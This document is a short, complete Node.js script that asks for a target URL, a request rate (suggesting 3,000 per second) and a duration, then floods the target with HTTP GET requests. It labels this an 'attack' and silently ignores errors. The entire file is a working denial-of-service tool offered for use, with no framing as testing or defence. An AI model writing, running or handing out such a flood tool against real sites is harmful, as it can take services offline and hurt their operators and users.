const http = require('http');
const url = require('url');
const readline = require('readline');

// Read user input
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

// Function to send HTTP requests
const sendRequest = (targetUrl) => {
  const parsedUrl = url.parse(targetUrl);
  const options = {
    hostname: parsedUrl.hostname,
    port: parsedUrl.port || 80,
    path: parsedUrl.path || '/',
    method: 'GET'
  };

  const req = http.request(options, (res) => {
    res.on('data', () => {});
    res.on('end', () => {});
  });

  req.on('error', () => {});
  req.end();
};

// Main function to start the attack
const startAttack = (targetUrl, requestsPerSecond, duration) => {
  const interval = 1000 / requestsPerSecond;  // Interval between requests in milliseconds
  const endTime = Date.now() + duration * 1000;

  console.log(`Starting attack on ${targetUrl} with ${requestsPerSecond} requests per second for ${duration} seconds`);

  const attackInterval = setInterval(() => {
    if (Date.now() >= endTime) {
      clearInterval(attackInterval);
      console.log('Attack completed.');
      return;
    }

    sendRequest(targetUrl);
  }, interval);
};

// Prompt user for input
rl.question('Enter target URL: ', (targetUrl) => {
  rl.question('Enter requests per second (e.g., 3000): ', (requestsPerSecond) => {
    rl.question('Enter attack duration in seconds (e.g., 60): ', (duration) => {
      const requestsPerSecondInt = parseInt(requestsPerSecond, 10);
      const durationInt = parseInt(duration, 10);

      if (isNaN(requestsPerSecondInt) || isNaN(durationInt) || requestsPerSecondInt <= 0 || durationInt <= 0) {
        console.error('Invalid input. Please enter positive numbers for requests per second and duration.');
        rl.close();
        return;
      }

      startAttack(targetUrl, requestsPerSecondInt, durationInt);
      rl.close();
    });
  });
});
                                     
